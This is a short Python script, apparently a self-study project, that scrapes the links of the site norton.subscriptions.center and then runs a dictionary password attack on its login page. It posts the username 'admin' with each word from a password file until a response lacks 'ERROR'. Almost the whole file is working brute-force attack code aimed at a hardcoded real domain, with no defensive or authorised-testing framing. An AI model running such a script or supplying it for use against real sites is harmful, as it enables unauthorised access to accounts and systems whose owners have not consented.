#!/usr/bin/env python
# coding: utf-8
'''
Project 6 03/2022
@Witch_Sec
https://github.com/miss-anthrope
'''
#Webform attack module using BeautifulSoup
print("Ok, so this script is learning how to attack web forms and logins. The URL MUST be hardcoded here.")

from bs4 import BeautifulSoup
import requests
requests.get("http://norton.subscriptions.center")
req_=requests.get("http://norton.subscriptions.center")
req_.headers
req_.content
soup=BeautifulSoup(req_.text,'html.parser')
print(soup.prettify())
print(soup.title)
home_=requests.get("http://norton.subscriptions.center")
soup=BeautifulSoup(home_.content,"html.parser")
imgs=soup.find_all("a",href=True)
imgs_href=[]

for img in imgs:
	imgs_href.append(img["href"])

imgs_set=set(imgs_href)

for img in imgs_set:
	print(img)

word_p=requests.get("http://norton.subscriptions.center/login/")
soup_word_p=BeautifulSoup(word_p.text,"html.parser")
print(soup_word_p.prettify())

passfile="password_dictionary.txt"

with open(passfile,"r") as f:
	for word in f:
		word=word.strip("\n")
		trying_=requests.post("http://norton.subscriptions.center/login/",data={"log":"admin","pwd":word})

		if "ERROR" not in trying_.text:
			print("Success! The password popped is: "+word)
			break
		else:
			print("Incorrect passwords include:"+word)